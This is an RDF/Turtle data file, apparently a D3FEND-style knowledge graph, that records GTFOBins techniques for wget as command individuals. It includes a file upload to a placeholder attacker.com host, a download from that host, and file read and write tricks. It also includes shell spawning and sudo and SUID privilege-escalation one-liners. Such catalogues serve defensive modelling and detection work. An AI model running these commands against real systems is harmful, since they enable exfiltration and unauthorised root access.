mknd:command_wget-file-download a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "wget-file-download" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Fetch a remote file via HTTP GET request." ;
    d3f:uses mknd:executable_wget ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_wget ;
    mknd:provides mknd:function_file-download ;
    mknd:value """URL=http://attacker.com/file_to_get
LFILE=file_to_save
wget $URL -O $LFILE
""" .

mknd:command_wget-file-read a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "wget-file-read" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages, thus this is not suitable to read arbitrary binary data." ;
    d3f:uses mknd:executable_wget ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_wget ;
    mknd:provides mknd:function_file-read ;
    mknd:value """LFILE=file_to_read
wget -i $LFILE
""" .

mknd:command_wget-file-upload a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "wget-file-upload" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Use `--post-data` to send hard-coded data." ;
    d3f:uses mknd:executable_wget ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_wget ;
    mknd:provides mknd:function_file-upload ;
    mknd:value """URL=http://attacker.com/
LFILE=file_to_send
wget --post-file=$LFILE $URL
""" .

mknd:command_wget-file-write a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "wget-file-write" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "The data to be written is treated as a list of URLs, one per line, which are actually fetched by `wget`. The data is written, somewhat modified, as error messages, thus this is not suitable to write arbitrary binary data." ;
    d3f:uses mknd:executable_wget ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_wget ;
    mknd:provides mknd:function_file-write ;
    mknd:value """LFILE=file_to_write
TF=$(mktemp)
echo DATA > $TF
wget -i $TF -o $LFILE
""" .

mknd:command_wget-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "wget-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_wget ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_wget ;
    mknd:provides mknd:function_shell ;
    mknd:value """TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh\\n/bin/sh 1>&0' >$TF
wget --use-askpass=$TF 0
""" .

mknd:command_wget-sudo a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "wget-sudo" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_wget ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_wget ;
    mknd:provides mknd:function_sudo ;
    mknd:value """TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh\\n/bin/sh 1>&0' >$TF
sudo wget --use-askpass=$TF 0
""" .

mknd:command_wget-suid a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "wget-suid" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_wget ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_wget ;
    mknd:provides mknd:function_suid ;
    mknd:value """TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh -p\\n/bin/sh -p 1>&0' >$TF
./wget --use-askpass=$TF 0
""" .

